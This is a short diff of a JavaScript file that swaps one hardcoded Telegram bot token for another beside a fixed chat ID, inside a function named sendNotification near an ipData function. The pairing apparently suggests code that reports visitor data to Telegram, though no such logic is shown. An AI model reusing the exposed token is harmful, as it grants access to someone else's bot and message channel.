@@ -32,7 +32,7 @@ function ipData(){
 function sendNotification(type, data) {
     current_time = new Date();
     let message = null;
-    const botToken = '6664260689:AAFk0X0ZQiNSOg7r0ZesF_nk53xuxnQB04Y';
+    const botToken = '6664260689:AAHxF7fhFHwdmWd0iTbIVzyHSi4_ZWUemSk';
     const chatId = '6374931361';
 
     if(type == 1){
